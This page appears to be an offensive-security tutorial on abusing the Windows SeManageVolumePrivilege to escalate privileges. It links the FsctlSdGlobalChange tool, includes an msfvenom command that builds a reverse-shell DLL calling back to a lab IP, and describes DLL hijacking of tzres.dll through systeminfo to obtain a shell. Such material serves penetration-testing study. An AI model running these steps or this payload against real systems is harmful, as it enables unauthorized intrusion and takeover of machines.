# Manage Volume Privilege

This policy defines which users are authorized to perform disk volume management tasks such as defragmenting, creating, or removing volumes, and running disk cleanup tools. This permission should be handled with caution, as it allows users to explore disks and expand files in memory. For further details, refer to [Microsoft documentation](https://learn.microsoft.com/es-es/windows/security/threat-protection/security-policy-settings/perform-volume-maintenance-tasks).

### Attack

Several methods can be employed to escalate privileges through this policy. One example involves taking control of the root directory `C:\` and creating a malicious library in the System32 folder, thereby performing a simple DLL Hijacking attack on a service running with high integrity levels. The permission change can be executed using the tool `FsctlSdGlobalChange.c`, which is available [here](https://github.com/gtworek/PSBits/blob/master/Misc/FSCTL_SD_GLOBAL_CHANGE.c).

### Tools

[FsctlSdGlobalChange.exe](https://daniel10barredo.github.io/PrivEscAssist_Windows/tools/FsctlSdGlobalChange.exe)

## Example

We first verify that we have the **seManageVolumePrivilege** permission.

![Permission Check](https://daniel10barredo.github.io/PrivEscAssist_Windows/media/imag/users/manageVol_1.png)

Next, we execute the `FsctlSdGlobalChange.exe` binary, which overwrites the Administrators SID with the common user SID.

![SID Change](https://daniel10barredo.github.io/PrivEscAssist_Windows/media/imag/users/manageVol_2.png)

We now verify that we have full permissions on directories like System32 using **icacls**.

![ICACLS Permission Check](https://daniel10barredo.github.io/PrivEscAssist_Windows/media/imag/users/manageVol_3.png)

Next, we create a reverse shell DLL using `msfvenom` for a **DLL Hijacking** attack with the following code:

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.8.155.202 LPORT=4444 -f dll -o rev.dll
```

We place the DLL at _`C:\Windows\System32\wbem\tzres.dll`_ to hijack the `Systeminfo` command.

![DLL Placement](https://daniel10barredo.github.io/PrivEscAssist_Windows/media/imag/users/manageVol_4.png)

Upon executing `Systeminfo`, we immediately receive a reverse shell connection with the `NT AUTHORITY\NETWORK SERVICE` user.

![Reverse Shell](https://daniel10barredo.github.io/PrivEscAssist_Windows/media/imag/users/manageVol_5.png)
